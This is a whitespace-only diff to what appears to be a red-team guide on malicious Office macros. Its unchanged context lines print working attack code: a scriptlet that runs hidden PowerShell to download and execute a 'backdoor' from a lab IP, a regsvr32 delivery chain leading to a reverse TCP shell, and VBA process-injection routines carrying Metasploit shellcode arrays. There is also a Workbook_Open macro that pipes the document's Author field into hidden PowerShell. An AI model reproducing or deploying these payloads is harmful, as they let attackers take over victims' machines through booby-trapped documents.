@@ -11,7 +11,7 @@ List:
 2. `regsvr32` based method
 3. Metasploit generated payload `vba-exe`
 4. Metasploit generated payload `vba-psh`
-5. `Empire` generated `windows/macro` stager 
+5. `Empire` generated `windows/macro` stager
 6. Using `Veil-Evasion` generated _powershell.exe_ command within `Luckystrike` generated macro
 7. `wePWNise` architecture-independent Macro dynamically bypassing SRPs+EMET
 8. Custom macro taking commands from *Author property* to feed them to `StdIn` of Powershell
@@ -206,7 +206,7 @@ As an example of such scriptlets we can use one of the [Casey Smith's payloads](
 <scriptlet>
 	<registration progid="PqYOEI6w" classid="{057b64c8-1107-cda1-3d34-062978395f62}">
 		<script>
-			<![CDATA[ 
+			<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.56.101/backdoor');", 0);
 			]]>
 		</script>
@@ -255,7 +255,7 @@ End Sub
 
 So the entire attack goes as follows:
 
-- Malicious document with `Run("regsvr32 [...] /i:http://[...]/file.sct")` 
+- Malicious document with `Run("regsvr32 [...] /i:http://[...]/file.sct")`
 - `file.sct` delivers Powershell Download & Exec command (`backdoor`)
 - `backdoor` Powershell CMD reverse tcp 2nd stage gets delivered and executed
 
@@ -938,7 +938,7 @@ lLinkToLibrary = watergun(hProcess, 0&, &H2be, &H3000, PAGE_READWRITE)
 If lLinkToLibrary = 0 Then
 sly = bodyslam(hProcess, lol)
 Exit Function
-End If      
+End If
 Position = lLinkToLibrary
 buf = Array(72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24,11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1, _
 208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224, _
@@ -1005,7 +1005,7 @@ lLinkToLibrary = watergun(hProcess, 0&, &H1b5, &H3000, PAGE_READWRITE)
 If lLinkToLibrary = 0 Then
 sly = bodyslam(hProcess, lol)
 Exit Function
-End If         
+End If
 Position = lLinkToLibrary
 buf = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1, _
 211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,255,213,49,219,83,83,83,83,83,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,192,0,0,0,47,85,55,69,102,86,99,88,70,120,72,104,116,122,87,122,77, _
@@ -1053,10 +1053,10 @@ Put the following macro (or modify it in some way)
 Private Sub Workbook_Open()
     Dim author As String
     author = ActiveWorkbook.BuiltinDocumentProperties("Author")
-    
+
     Dim ws As Object
     Set ws = CreateObject("WScript.Shell")
-    
+
     With ws.Exec("powershell.exe -nop -WindowStyle hidden -Command -")
         .StdIn.WriteLine author
         .StdIn.WriteBlankLines 1
